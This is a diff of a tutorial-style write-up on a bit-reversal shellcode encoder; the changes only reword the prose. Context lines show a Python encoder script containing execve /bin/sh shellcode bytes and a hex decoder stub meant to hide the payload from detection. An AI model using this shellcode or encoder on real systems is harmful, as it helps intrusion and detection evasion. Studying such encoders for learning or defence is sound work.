@@ -32,7 +32,7 @@ so after reversing of its bits, it will become 10011010, or 9A in hexadecimal.
 
 ### Implementation
 
-The implementation is also very simple, here is the encoder made with Python :
+The implementation is also very simple, here is the encoder part from the Python script :
 
 ```python
 # Convert the shellcode string into a bytes object
@@ -102,7 +102,7 @@ decoder:
 ; The encoded shellcode will be added here in the python script
 ```
 
-Then we compile it and extract the shellcode :
+To use it in the Python script we need to compile it and extract the shellcode :
 
 ```plaintext
 root@kali:~# ./compile.sh reverse-encoder
@@ -115,7 +115,7 @@ Shellcode :
 ```
 
 And we insert it in the Python script after a little update, 
-the ninth byte is the encoded shellcode size, so we need to replace it with {0} and we add {1} at the end, where the encoded shellcode will be.
+the ninth byte is the encoded shellcode size, so we need to replace it with {0} and we add {1} at the end, where the encoded shellcode will be added.
 
 ```python
 #!/usr/bin/python3
@@ -139,7 +139,7 @@ shellcode = "\\x31\\xc9\\xf7\\xe1\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\
 #    mov al, 0x0b
 #    int 0x80
 
-# Max payload to encode length : 255 bytes
+# Reverse bit decoder
 decoder = "\\xeb\\x17\\x8b\\x1c\\x24\\x31\\xc9\\xb1{0}\\x51\\xb1\\x08\\xd0\\x2b\\x10\\xc0\\xe2\\xfa\\x88\\x03\\x43\\x59\\xe2\\xf1\\xc3\\xe8\\xe4\\xff\\xff\\xff{1}"
 
 # Convert the shellcode string into a bytes object
